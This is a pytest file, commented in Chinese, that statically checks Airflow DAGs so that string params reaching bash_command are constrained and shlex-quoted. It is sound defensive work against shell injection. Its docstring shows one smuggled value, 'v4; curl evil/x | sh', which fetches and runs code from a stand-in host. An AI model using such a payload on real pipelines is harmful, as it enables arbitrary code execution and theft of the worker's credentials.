"""DAG params 進 bash_command 之前，有沒有被約束與引號包裹。

`BashOperator.bash_command` 是**字串串接後交給 shell 解析**的。一個沒有約束的
string 型 param 直接插進去，等於把 shell 的**語法**交給填表單的人決定：

    expect_rule_version = "v4; curl evil/x | sh"
    → …reevaluate_quality.py --expect-rule-version v4; curl evil/x | sh
                                                     ↑ 分號之後是另一條命令

那會在 worker 容器內執行，而那個容器握有 DB_URL、API_KEYS、GCP 金鑰
（見 docs/zh-TW/design/orchestration.md）。RBAC 的前提是「trigger DAG」比
「改 DAG 程式碼」低權限——這個洞讓兩者等價。

本檔釘住兩層，缺一不可：

  ① 約束（pattern / enum）  Airflow 在 **UI 就擋掉**，錯誤不會進到 task
  ② 引號（`| q` = shlex.quote）  就算 ① 日後被放寬，值仍是**單一 shell 參數**

⚠️ 為什麼兩層都要：① 是 JSON Schema，它的正確性取決於那條 pattern 寫得對不對；
   ② 不管值長什麼樣都成立。只留 ① 的話，任何一次「把 pattern 放寬一點」的
   commit 都會靜默地把洞打開，而那種 commit 看起來完全無害。

⚠️ 為什麼是純靜態、不放進 tests/test_dags.py：那支檔頭就 importorskip("airflow")，
   只在獨立的 dags CI job 跑。改 DAG 的人跑的是主套件——紅燈要出現在他面前。
   同 tests/test_script_deps.py 的理由。

⚠️ 非 string 型 param（integer / number / boolean）不在管轄範圍：它們的值域由
   JSON Schema 驗證，插進 shell 也只會是數字或 true/false。**string 型才是需要盯的。**
"""

from __future__ import annotations

import ast
import re
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
DAGS_FOLDER = ROOT / "orchestration" / "dags"

# 讓值域受限的 kwarg。任何一個存在就算「已約束」。
CONSTRAINING_KWARGS = {"pattern", "enum", "const", "format"}

# `params.foo` / `params['foo']` 兩種寫法都要抓。
_PARAM_REF = re.compile(r"params(?:\.(\w+)|\[[\"'](\w+)[\"']\])")


def _dag_files() -> list[Path]:
    """DAG 檔（排除 `_` 開頭的輔助模組，見 test_dags.py 的同一條慣例）。"""
    return sorted(p for p in DAGS_FOLDER.glob("*.py") if not p.name.startswith("_"))


def _string_params(tree: ast.AST) -> set[tuple[str, bool]]:
    """該檔宣告的 string 型 param → (名稱, 是否已約束)。

    只認 `Param(...)` 呼叫，且只在它是某個 dict 的 value 時才取 key 當名稱——
    那是 `params={...}` 的唯一寫法。
    """
    found: set[tuple[str, bool]] = set()
    for node in ast.walk(tree):
        if not isinstance(node, ast.Dict):
            continue
        for key, value in zip(node.keys, node.values):
            if not (isinstance(key, ast.Constant) and isinstance(key.value, str)):
                continue
            if not (isinstance(value, ast.Call) and getattr(value.func, "id", None) == "Param"):
                continue
            kwargs = {kw.arg for kw in value.keywords if kw.arg}
            type_kw = next((kw.value for kw in value.keywords if kw.arg == "type"), None)
            declared = ast.unparse(type_kw) if type_kw is not None else ""
            if "string" not in declared:
                continue
            found.add((key.value, bool(kwargs & CONSTRAINING_KWARGS)))
    return found


def _bash_command_sources(tree: ast.AST) -> list[str]:
    """每個 `bash_command=` 的原始碼字串（未求值，足以做文字檢查）。"""
    out: list[str] = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            for kw in node.keywords:
                if kw.arg == "bash_command":
                    out.append(ast.unparse(kw.value))
    return out


def _referenced_in(source: str) -> set[str]:
    return {a or b for a, b in _PARAM_REF.findall(source)}


def _unquoted_interpolations(source: str, name: str) -> int:
    """該 param 有幾次是「被插值到輸出、卻沒過 `| q`」。

    ⚠️ 不能要求「每一次出現都包裹」——同一個 param 在 Jinja 裡通常出現兩次：

        {{ ' --flag ' ~ (params.x | q) if params.x else '' }}
                         ↑ 插值，要包裹      ↑ 只是真值判斷，不進輸出

    判準是**它在不在插值位置**：前面緊接 `~`（Jinja 的字串串接）或 `{{`。
    `if` / `else` 後面的那個不進輸出，包不包裹都不影響 shell 看到什麼。
    """
    ref = rf"params(?:\.{name}\b|\[[\"']{name}[\"']\])"
    bad = 0
    for m in re.finditer(ref, source):
        before = source[:m.start()].rstrip()
        before = before.rstrip("(").rstrip()          # 容忍 `~ (params.x | q)`
        interpolated = before.endswith("~") or before.endswith("{{")
        if not interpolated:
            continue
        if re.match(r"\s*\|\s*q\b", source[m.end():]) is None:
            bad += 1
    return bad


DAG_FILES = _dag_files()


class TestDagFileInventory:
    """先確定「有東西被掃到」——清單空了，下面的測試都在測空氣。"""

    def test_dag_files_were_found(self):
        assert DAG_FILES, (
            f"在 {DAGS_FOLDER} 找不到任何 DAG 檔。目錄搬了的話這條 glob 要跟著改，"
            "否則本檔會靜默地什麼都不測。"
        )


class TestStringParamsReachingShell:
    """string 型 param 進 bash_command，必須同時通過約束與引號兩層。"""

    @pytest.mark.parametrize("dag_file", DAG_FILES, ids=lambda p: p.name)
    def test_string_params_are_constrained_and_quoted(self, dag_file: Path):
        source = dag_file.read_text(encoding="utf-8")
        tree = ast.parse(source, filename=str(dag_file))

        commands = _bash_command_sources(tree)
        if not commands:
            pytest.skip(f"{dag_file.name} 沒有 BashOperator")

        params = _string_params(tree)
        reachable = {name for cmd in commands for name in _referenced_in(cmd)}

        problems: list[str] = []
        for name, constrained in sorted(params):
            if name not in reachable:
                continue
            if not constrained:
                problems.append(
                    f"  · {name}：string 型且進了 bash_command，卻沒有 "
                    f"{sorted(CONSTRAINING_KWARGS)} 任一個 —— UI 不會擋掉任何值"
                )
            bad = sum(_unquoted_interpolations(cmd, name) for cmd in commands)
            if bad:
                problems.append(
                    f"  · {name}：有 {bad} 處被插值進 bash_command 卻沒過 `| q`"
                    "（shlex.quote）—— 值裡的 ; | $() 會被 shell 當成語法"
                )

        assert not problems, (
            f"{dag_file.name} 的 string 型 param 直接進了 shell：\n"
            + "\n".join(problems)
            + "\n\n兩層都要："
            "\n  ① Param(..., pattern=r\"^v[0-9]+$\")      在 UI 就擋掉"
            "\n  ② {{ params.x | q }} + DAG(user_defined_filters={\"q\": shlex.quote})"
            "\n\nworker 容器握有 DB_URL / API_KEYS / GCP 金鑰，"
            "這條路徑的失效是任意程式碼執行，不是壞掉的參數。"
        )

    def test_quote_filter_is_registered_where_used(self):
        """用了 `| q` 的 DAG，必須真的註冊那個 filter——沒註冊會在執行時才炸。"""
        for dag_file in DAG_FILES:
            source = dag_file.read_text(encoding="utf-8")
            if not re.search(r"\|\s*q\b", source):
                continue
            assert "user_defined_filters" in source and "shlex.quote" in source, (
                f"{dag_file.name} 用了 `| q` 卻沒有註冊它。"
                "DAG(...) 要加 user_defined_filters={\"q\": shlex.quote}，"
                "否則 Jinja 會在 task 執行時才抛 TemplateAssertionError。"
            )
